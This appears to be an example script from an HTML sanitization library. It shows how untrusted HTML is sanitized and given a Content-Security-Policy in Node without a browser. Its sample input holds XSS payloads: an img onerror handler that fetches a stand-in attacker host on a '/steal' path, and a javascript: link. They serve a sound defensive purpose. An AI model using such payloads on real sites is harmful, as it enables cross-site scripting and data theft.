// Node example: run the full pipeline (decode → sanitize → CSP → bridge) WITHOUT
// creating an iframe. Useful for self-managed webviews, SSR pre-processing, or a
// CLI that turns untrusted HTML into a safe, self-contained document string.
//
// Run from the repo root after `npm run build`:
//   node examples/node-create-document/convert.mjs
//
// The Node entry uses DOMPurify + jsdom, so no browser is required.
import { createHtmlDocument } from '../../dist/index.js';

const untrusted = `<!doctype html>
<html>
  <body>
    <h1>Report</h1>
    <p>Interactive but untrusted.</p>
    <img src="x" onerror="fetch('https://attacker.example/steal')">
    <a href="javascript:alert(1)">do not run</a>
    <script>console.log('kept: runs only inside the sandbox the host mounts')</script>
  </body>
</html>`;

const result = await createHtmlDocument(untrusted, { csp: 'strict' });

console.log('encoding:', result.encoding);
console.log('sanitizer removed:', JSON.stringify(result.sanitizeReport, null, 2));
console.log('safe document length:', result.html.length, 'bytes');
console.log('has CSP meta:', /Content-Security-Policy/.test(result.html));

// result.html is a complete, sanitized, CSP-injected document string. The host is
// still responsible for rendering it inside a sandboxed context (iframe/webview)
// without allow-same-origin — createHtmlDocument does the pipeline, not the isolation.
